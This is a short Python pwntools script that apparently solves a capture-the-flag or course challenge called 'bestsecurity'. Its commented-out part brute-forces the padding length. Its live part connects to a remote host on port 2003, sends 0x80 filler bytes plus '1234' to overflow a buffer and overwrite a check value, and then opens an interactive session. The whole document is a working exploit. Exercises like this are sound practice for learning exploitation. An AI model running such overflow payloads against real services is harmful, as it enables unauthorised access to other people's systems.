from pwn import *
import re

# # Hi Ben
# for i in range(0, 0x88):
#     print(i, "pads")
#     p = process("./bestsecurity")
#     data = p.recv()

#     p.sendline(b"D" * i + b"1234")
#     p.recv()
#     p.poll(block=True)
#     # Stonks

# p = process("./bestsecurity")
p = remote("plsdonthaq.me", 2003)
data = p.recv()
p.sendline(b"D" * 0x80 + b"1234")
p.interactive()